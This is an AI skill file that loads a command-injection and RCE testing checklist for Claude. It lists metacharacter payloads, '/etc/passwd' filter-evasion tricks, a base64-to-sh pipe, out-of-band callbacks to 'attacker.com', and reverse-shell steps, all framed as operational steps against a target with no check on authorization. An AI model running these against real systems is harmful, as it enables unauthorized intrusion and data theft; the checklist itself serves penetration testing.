# SKILL: Remote Code Execution (RCE) & Command Injection

## Metadata
- **Skill Name**: rce
- **Folder**: offensive-rce
- **Source**: https://github.com/SnailSploit/offensive-checklist/blob/main/rce.md

## Description
Remote Code Execution and OS Command Injection testing checklist: shell metacharacter injection (;, |, &&, `, $()), blind command injection via time-delays and DNS/HTTP out-of-band exfiltration, argument injection, space/quote filter bypasses, environment variable expansions, deserialization to RCE chains, and interactive shell stabilization.

## Trigger Phrases
Use this skill when the conversation involves any of:
`RCE, remote code execution, command injection, os command injection, shell injection, blind rce, reverse shell, oob exfiltration, shell breakout, metacharacters bypass`

## Instructions for Claude

When this skill is active:
1. Load and apply the full methodology below as your operational checklist
2. Follow steps in order unless the user specifies otherwise
3. For each technique, consider applicability to the current target/context
4. Track which checklist items have been completed
5. Suggest next steps based on findings

---

## Full Methodology

# Remote Code Execution (RCE) & Command Injection

## Shortcut

- Identify parameters interacting with system calls or shell commands (`exec`, `system`, `popen`, `child_process`).
- Inject shell metacharacters: `;`, `&`, `&&`, `|`, `||`, newline (`%0a`), backticks, `$()`.
- Test for visible output in the HTTP response.
- If in-band output is suppressed, test for Blind RCE using time delays (`sleep 10`, `timeout /t 10`).
- Test Out-of-Band (OOB) DNS/HTTP callback channels (`curl attacker.com`, `nslookup test.attacker.com`).
- Overcome filter protections (whitespace bypass, character encoding, base64 decoding pipes).
- Establish reverse shell or execute proof-of-concept command (`id`, `whoami`, `hostname`).

## Mechanisms

Command injection occurs when an application executes arbitrary system-level commands through user-supplied input concatenated directly into a shell interpreter without proper sanitization or parameterized execution.

### Separator and Metacharacter Matrix

| Metacharacter | Usage | Context |
| :--- | :--- | :--- |
| `;` | Command separator | Unix / Bash |
| `&` | Background execution | Unix / Windows |
| `&&` | Boolean AND execution | Unix / Windows |
| `\|` | Standard pipe | Unix / Windows |
| `\|\|` | Boolean OR execution | Unix / Windows |
| `\n` (`%0a`) | Newline separator | Unix / Windows |
| `` `cmd` `` | Subshell execution | Unix |
| `$(cmd)` | Subshell execution | Unix / PowerShell |

### Filter Evasion Techniques

- **Whitespace bypass:** `${IFS}`, `$IFS$9`, `{cat,/etc/passwd}`, `<` redirection, `%09` (Tab).
- **String concatenation:** `w'h'o'a'm'i`, `w"h"o"a"m"i`, `who$()ami`.
- **Base64 execution:** `echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh`.
- **Environment variables:** `${PATH:0:1}` for `/`, `${PWD:0:1}` for directory traversal.
